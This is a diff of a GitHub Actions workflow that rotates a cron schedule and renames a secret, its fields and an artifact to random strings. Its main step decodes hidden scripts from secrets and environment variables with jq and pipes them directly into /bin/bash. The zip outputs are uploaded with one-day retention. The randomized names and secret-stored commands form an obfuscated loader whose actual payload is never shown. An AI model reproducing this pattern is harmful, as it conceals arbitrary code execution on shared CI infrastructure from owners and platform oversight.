@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '4 2,8,14,20 * * *'
+    - cron: '16 1,7,13,19 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -17,18 +17,17 @@ jobs:
           fetch-depth: 1
       - name: Initialize
         env:
-          tgj02337: ${{ secrets.tgj02337 }}
+          rhaoq915: ${{ secrets.rhaoq915 }}
         run: |
-          printf '%s' "$tgj02337" | jq -r .ajpxe7 | /bin/bash
-          echo $qz5 | jq -r .ptmds97 | /bin/bash
-          printf '%s' "$akwhv8" | jq -r .edf54 | /bin/bash
-          echo $irvef923 | jq -r .gr4565 | /bin/bash
-          echo $qyek9322 | jq -r .c11 | /bin/bash
+          printf '%s' "$rhaoq915" | jq -r .kske10 | /bin/bash
+          printf '%s' "$vmyjx8" | jq -r .gd7 | /bin/bash
+          echo $gkgur15 | jq -r .l16888 | /bin/bash
+          echo $iwezz351 | jq -r .ztwg34387 | /bin/bash
 
       - name: Persist results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: alx6vgR2
+          name: eXmisD4b
           path: "*.zip"
           retention-days: 1
